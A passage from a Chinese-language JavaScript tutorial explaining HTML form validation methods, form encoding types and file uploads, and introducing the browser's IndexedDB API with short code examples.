<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var myInput &#x3D; document.getElementById(&#39;myinput&#39;);</span><br><span class="line">if (!myInput.checkValidity()) &#123;</span><br><span class="line">  document.getElementById(&#39;prompt&#39;).innerHTML &#x3D; myInput.validationMessage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="setCustomValidity"><a href="#setCustomValidity" class="headerlink" title="setCustomValidity()"></a>setCustomValidity()</h4><p>控件元素的<code>setCustomValidity()</code>方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。</p>
<p>这个方法可以替换浏览器内置的表单验证报错信息，参数就是要显示的报错信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;somefile.php&quot;&gt;</span><br><span class="line">  &lt;input</span><br><span class="line">    type&#x3D;&quot;text&quot;</span><br><span class="line">    name&#x3D;&quot;username&quot;</span><br><span class="line">    placeholder&#x3D;&quot;Username&quot;</span><br><span class="line">    pattern&#x3D;&quot;[a-z]&#123;1,15&#125;&quot;</span><br><span class="line">    id&#x3D;&quot;username&quot;</span><br><span class="line">  &gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>上面的表单输入框，要求只能输入小写字母，且不得超过15个字符。如果输入不符合要求（比如输入“ABC”），提交表单的时候，Chrome 浏览器会弹出报错信息“Please match the requested format.”，禁止表单提交。下面使用<code>setCustomValidity()</code>方法替换掉报错信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;username&#39;);</span><br><span class="line">input.oninvalid &#x3D; function (event) &#123;</span><br><span class="line">  event.target.setCustomValidity(</span><br><span class="line">    &#39;用户名必须是小写字母，不能为空，最长不超过15个字符&#39;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>setCustomValidity()</code>方法是在<code>invalid</code>事件的监听函数里面调用。该方法也可以直接调用，这时如果参数不为空字符串，浏览器就会认为该控件没有通过校验，就会立刻显示该方法设置的报错信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* HTML 代码如下</span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;p&gt;&lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;fs&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;p&gt;&lt;input type&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">document.getElementById(&#39;fs&#39;).onchange &#x3D; checkFileSize;</span><br><span class="line"></span><br><span class="line">function checkFileSize() &#123;</span><br><span class="line">  var fs &#x3D; document.getElementById(&#39;fs&#39;);</span><br><span class="line">  var files &#x3D; fs.files;</span><br><span class="line">  if (files.length &gt; 0) &#123;</span><br><span class="line">     if (files[0].size &gt; 75 * 1024) &#123;</span><br><span class="line">       fs.setCustomValidity(&#39;文件不能大于 75KB&#39;);</span><br><span class="line">       return;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fs.setCustomValidity(&#39;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。</p>
<h4 id="validity-属性"><a href="#validity-属性" class="headerlink" title="validity 属性"></a>validity 属性</h4><p>控件元素的属性<code>validity</code>属性返回一个<code>ValidityState</code>对象，包含当前校验状态的信息。</p>
<p>该对象有以下属性，全部为只读属性。</p>
<ul>
<li><code>ValidityState.badInput</code>：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。</li>
<li><code>ValidityState.customError</code>：布尔值，表示是否已经调用<code>setCustomValidity()</code>方法，将校验信息设置为一个非空字符串。</li>
<li><code>ValidityState.patternMismatch</code>：布尔值，表示用户输入的值是否不满足模式的要求。</li>
<li><code>ValidityState.rangeOverflow</code>：布尔值，表示用户输入的值是否大于最大范围。</li>
<li><code>ValidityState.rangeUnderflow</code>：布尔值，表示用户输入的值是否小于最小范围。</li>
<li><code>ValidityState.stepMismatch</code>：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。</li>
<li><code>ValidityState.tooLong</code>：布尔值，表示用户输入的字数超出了最长字数。</li>
<li><code>ValidityState.tooShort</code>：布尔值，表示用户输入的字符少于最短字数。</li>
<li><code>ValidityState.typeMismatch</code>：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。</li>
<li><code>ValidityState.valid</code>：布尔值，表示用户是否满足所有校验条件。</li>
<li><code>ValidityState.valueMissing</code>：布尔值，表示用户没有填入必填的值。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;myinput&#39;);</span><br><span class="line">if (input.validity.valid) &#123;</span><br><span class="line">  console.log(&#39;通过校验&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  console.log(&#39;校验失败&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是另外一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var txt &#x3D; &#39;&#39;;</span><br><span class="line">if (document.getElementById(&#39;myInput&#39;).validity.rangeOverflow) &#123;</span><br><span class="line">  txt &#x3D; &#39;数值超过上限&#39;;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&#39;prompt&#39;).innerHTML &#x3D; txt;</span><br></pre></td></tr></table></figure>

<p>如果想禁止浏览器弹出表单验证的报错信息，可以监听<code>invalid</code>事件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;username&#39;);</span><br><span class="line">var form  &#x3D; document.getElementById(&#39;form&#39;);</span><br><span class="line"></span><br><span class="line">var elem &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">elem.id  &#x3D; &#39;notify&#39;;</span><br><span class="line">elem.style.display &#x3D; &#39;none&#39;;</span><br><span class="line">form.appendChild(elem);</span><br><span class="line"></span><br><span class="line">input.addEventListener(&#39;invalid&#39;, function (event) &#123;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">  if (!event.target.validity.valid) &#123;</span><br><span class="line">    elem.textContent   &#x3D; &#39;用户名必须是小写字母&#39;;</span><br><span class="line">    elem.className     &#x3D; &#39;error&#39;;</span><br><span class="line">    elem.style.display &#x3D; &#39;block&#39;;</span><br><span class="line">    input.className    &#x3D; &#39;invalid animated shake&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">input.addEventListener(&#39;input&#39;, function(event)&#123;</span><br><span class="line">  if ( &#39;block&#39; &#x3D;&#x3D;&#x3D; elem.style.display ) &#123;</span><br><span class="line">    input.className &#x3D; &#39;&#39;;</span><br><span class="line">    elem.style.display &#x3D; &#39;none&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，一旦发生<code>invalid</code>事件（表单验证失败），<code>event.preventDefault()</code>用来禁止浏览器弹出默认的验证失败提示，然后设置定制的报错提示框。</p>
<h4 id="表单的-novalidate-属性"><a href="#表单的-novalidate-属性" class="headerlink" title="表单的 novalidate 属性"></a>表单的 novalidate 属性</h4><p>表单元素的 HTML 属性<code>novalidate</code>，可以关闭浏览器的自动校验。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form novalidate&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>这个属性也可以在脚本里设置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">form.noValidate &#x3D; true;</span><br></pre></td></tr></table></figure>

<p>如果表单元素没有设置<code>novalidate</code>属性，那么提交按钮（<code>&lt; button&gt;</code>或<code>&lt; input&gt;</code>元素）的<code>formnovalidate</code>属性也有同样的作用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; formnovalidate&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<h3 id="enctype-属性"><a href="#enctype-属性" class="headerlink" title="enctype 属性"></a>enctype 属性</h3><p>表单能够用四种编码，向服务器发送数据。编码格式由表单的<code>enctype</code>属性决定。</p>
<p>假定表单有两个字段，分别是<code>foo</code>和<code>baz</code>，其中<code>foo</code>字段的值等于<code>bar</code>，<code>baz</code>字段的值是一个分为两行的字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure>

<p>下面四种格式，都可以将这个表单发送到服务器。</p>
<p><strong>（1）GET 方法</strong></p>
<p>如果表单使用<code>GET</code>方法发送数据，<code>enctype</code>属性无效。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action&#x3D;&quot;register.php&quot;</span><br><span class="line">  method&#x3D;&quot;get&quot;</span><br><span class="line">  onsubmit&#x3D;&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>数据将以 URL 的查询字符串发出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?foo&#x3D;bar&amp;baz&#x3D;The%20first%20line.%0AThe%20second%20line.</span><br></pre></td></tr></table></figure>

<p><strong>（2）application&#x2F;x-www-form-urlencoded</strong></p>
<p>如果表单用<code>POST</code>方法发送数据，并省略<code>enctype</code>属性，那么数据以<code>application/x-www-form-urlencoded</code>格式发送（因为这是默认值）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action&#x3D;&quot;register.php&quot;</span><br><span class="line">  method&#x3D;&quot;post&quot;</span><br><span class="line">  onsubmit&#x3D;&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>发送的 HTTP 请求如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">foo&#x3D;bar&amp;baz&#x3D;The+first+line.%0D%0AThe+second+line.%0D%0A</span><br></pre></td></tr></table></figure>

<p>上面代码中，数据体里面的<code>%0D%0A</code>代表换行符（<code>\r\n</code>）。</p>
<p><strong>（3）text&#x2F;plain</strong></p>
<p>如果表单使用<code>POST</code>方法发送数据，<code>enctype</code>属性为<code>text/plain</code>，那么数据将以纯文本格式发送。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action&#x3D;&quot;register.php&quot;</span><br><span class="line">  method&#x3D;&quot;post&quot;</span><br><span class="line">  enctype&#x3D;&quot;text&#x2F;plain&quot;</span><br><span class="line">  onsubmit&#x3D;&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>发送的 HTTP 请求如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">foo&#x3D;bar</span><br><span class="line">baz&#x3D;The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure>

<p><strong>（4）multipart&#x2F;form-data</strong></p>
<p>如果表单使用<code>POST</code>方法，<code>enctype</code>属性为<code>multipart/form-data</code>，那么数据将以混合的格式发送。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action&#x3D;&quot;register.php&quot;</span><br><span class="line">  method&#x3D;&quot;post&quot;</span><br><span class="line">  enctype&#x3D;&quot;multipart&#x2F;form-data&quot;</span><br><span class="line">  onsubmit&#x3D;&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>发送的 HTTP 请求如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------314911788813839</span><br><span class="line"></span><br><span class="line">-----------------------------314911788813839</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;foo&quot;</span><br><span class="line"></span><br><span class="line">bar</span><br><span class="line">-----------------------------314911788813839</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;baz&quot;</span><br><span class="line"></span><br><span class="line">The first line.</span><br><span class="line">The second line.</span><br><span class="line"></span><br><span class="line">-----------------------------314911788813839--</span><br></pre></td></tr></table></figure>

<p>这种格式也是文件上传的格式。</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot; name&#x3D;&quot;myFile&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>此外，还需要将表单<code>&lt;form&gt;</code>元素的<code>method</code>属性设为<code>POST</code>，<code>enctype</code>属性设为<code>multipart/form-data</code>。其中，<code>enctype</code>属性决定了 HTTP 头信息的<code>Content-Type</code>字段的值，默认情况下这个字段的值是<code>application/x-www-form-urlencoded</code>，但是文件上传的时候要改成<code>multipart/form-data</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;选择一个文件&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot; name&#x3D;&quot;myFile&quot; multiple&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; id&#x3D;&quot;submit&quot; name&#x3D;&quot;submit_button&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>上面的 HTML 代码中，file 控件的<code>multiple</code>属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var fileSelect &#x3D; document.getElementById(&#39;file&#39;);</span><br><span class="line">var files &#x3D; fileSelect.files;</span><br></pre></td></tr></table></figure>

<p>然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var formData &#x3D; new FormData();</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">  var file &#x3D; files[i];</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 只上传图片文件</span><br><span class="line">  if (!file.type.match(&#39;image.*&#39;)) &#123;</span><br><span class="line">    continue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  formData.append(&#39;photos[]&#39;, file, file.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，使用 Ajax 向服务器上传文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;handler.php&#39;, true);</span><br><span class="line"></span><br><span class="line">xhr.onload &#x3D; function () &#123;</span><br><span class="line">  if (xhr.status !&#x3D;&#x3D; 200) &#123;</span><br><span class="line">    console.log(&#39;An error occurred!&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(formData);</span><br></pre></td></tr></table></figure>

<p>除了发送 FormData 实例，也可以直接 AJAX 发送文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var file &#x3D; document.getElementById(&#39;test-input&#39;).files[0];</span><br><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;myserver&#x2F;uploads&#39;);</span><br><span class="line">xhr.setRequestHeader(&#39;Content-Type&#39;, file.type);</span><br><span class="line">xhr.send(file);</span><br></pre></td></tr></table></figure>

<h2 id="IndexedDB-API"><a href="#IndexedDB-API" class="headerlink" title="IndexedDB API"></a>IndexedDB API</h2><h3 id="概述-7"><a href="#概述-7" class="headerlink" title="概述"></a>概述</h3><p>随着浏览器的功能不断增强，越来越多的网站开始考虑，将大量数据储存在客户端，这样可以减少从服务器获取数据，直接从本地获取数据。</p>
<p>现有的浏览器数据储存方案，都不适合储存大量数据：Cookie 的大小不超过 4KB，且每次请求都会发送回服务器；LocalStorage 在 2.5MB 到 10MB 之间（各家浏览器不同），而且不提供搜索功能，不能建立自定义的索引。所以，需要一种新的解决方案，这就是 IndexedDB 诞生的背景。</p>
<p>通俗地说，IndexedDB 就是浏览器提供的本地数据库，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。</p>
<p>IndexedDB 具有以下特点。</p>
<p><strong>（1）键值对储存。</strong> IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以“键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。</p>
<p><strong>（2）异步。</strong> IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。</p>
<p><strong>（3）支持事务。</strong> IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。</p>
<p><strong>（4）同源限制。</strong> IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。</p>
<p><strong>（5）储存空间大。</strong> IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。</p>
<p><strong>（6）支持二进制储存。</strong> IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。</p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。</p>
<ul>
<li>数据库：IDBDatabase 对象</li>
<li>对象仓库：IDBObjectStore 对象</li>
<li>索引： IDBIndex 对象</li>
<li>事务： IDBTransaction 对象</li>
<li>操作请求：IDBRequest 对象</li>
<li>指针： IDBCursor 对象</li>
<li>主键集合：IDBKeyRange 对象</li>
</ul>
<p>下面是一些主要的概念。</p>
<p><strong>（1）数据库</strong></p>
<p>数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。</p>
<p>IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。</p>
<p><strong>（2）对象仓库</strong></p>
<p>每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。</p>
<p><strong>（3）数据记录</strong></p>
<p>对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; id: 1, text: &#39;foo&#39; &#125;</span><br></pre></td></tr></table></figure>

<p>上面的对象中，<code>id</code>属性可以当作主键。</p>
<p>数据体可以是任意数据类型，不限于对象。</p>
<p><strong>（4）索引</strong></p>
<p>为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。</p>
<p><strong>（5）事务</strong></p>
<p>数据记录的读写和删改，都要通过事务完成。事务对象提供<code>error</code>、<code>abort</code>和<code>complete</code>三个事件，用来监听操作结果。</p>
<h3 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h3><p>IndexedDB 数据库的各种操作，一般是按照下面的流程进行的。这个部分只给出简单的代码示例，用于快速上手，详细的各个对象的 API 放在后文介绍。</p>
<h4 id="打开数据库"><a href="#打开数据库" class="headerlink" title="打开数据库"></a>打开数据库</h4><p>使用 IndexedDB 的第一步是打开数据库，使用<code>indexedDB.open()</code>方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var request &#x3D; window.indexedDB.open(databaseName, version);</span><br></pre></td></tr></table></figure>

<p>这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为<code>1</code>。</p>
<p><code>indexedDB.open()</code>方法返回一个 IDBRequest 对象。这个对象通过三种事件<code>error</code>、<code>success</code>、<code>upgradeneeded</code>，处理打开数据库的操作结果。</p>
<p><strong>（1）error 事件</strong></p>
<p><code>error</code>事件表示打开数据库失败。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">request.onerror &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;数据库打开报错&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>（2）success 事件</strong></p>
<p><code>success</code>事件表示成功打开数据库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line"></span><br><span class="line">request.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  db &#x3D; request.result;</span><br><span class="line">  console.log(&#39;数据库打开成功&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这时，通过<code>request</code>对象的<code>result</code>属性拿到数据库对象。</p>
<p><strong>（3）upgradeneeded 事件</strong></p>
<p>如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件<code>upgradeneeded</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded &#x3D; function (event) &#123;</span><br><span class="line">  db &#x3D; event.target.result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时通过事件对象的<code>target.result</code>属性，拿到数据库实例。</p>
<h4 id="新建数据库"><a href="#新建数据库" class="headerlink" title="新建数据库"></a>新建数据库</h4><p>新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在<code>upgradeneeded</code>事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。</p>
<p>通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">request.onupgradeneeded &#x3D; function(event) &#123;</span><br><span class="line">  db &#x3D; event.target.result;</span><br><span class="line">  var objectStore &#x3D; db.createObjectStore(&#39;person&#39;, &#123; keyPath: &#39;id&#39; &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，数据库新建成功以后，新增一张叫做<code>person</code>的表格，主键是<code>id</code>。</p>
<p>更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。</p>
